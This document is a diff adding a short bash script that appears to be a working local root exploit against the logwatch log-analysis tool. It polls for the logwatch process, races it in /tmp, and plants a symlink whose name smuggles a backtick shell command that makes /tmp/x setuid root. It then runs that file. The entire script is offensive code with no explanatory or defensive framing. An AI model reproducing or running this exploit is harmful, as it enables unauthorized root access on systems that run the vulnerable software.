@@ -1,0 +1,29 @@
+#!/bin/bash
+
+    PROGNAME="00-logwatch"
+    SCRIPTDIR=/etc/log.d/scripts/logfiles/samba/
+    #SCRIPTDIR=/etc/log.d/scripts/logfiles/cron/
+    #SCRIPTDIR=/etc/log.d/scripts/logfiles/xferlog/
+
+    echo "ready to pounce..."
+    while :; do
+      set `ps -o pid -C $PROGNAME`
+        if [ -n "$2" ]; then
+          mkdir /tmp/logwatch.$2   
+          ln -s $SCRIPTDIR'`cd tmp;chown root:root x;chmod 4777 x`' /tmp/logwatch.$2/cron
+	  echo "making the changes now..."
+          break;
+        fi
+    done
+
+    echo "waiting..."
+    while :; do
+      set `ps -o pid -C $PROGNAME`
+        if [ -z "$2" ]; then
+    	  echo "job exited cleanly."
+          break;
+        fi
+    done
+    
+    #execute the program
+    /tmp/x
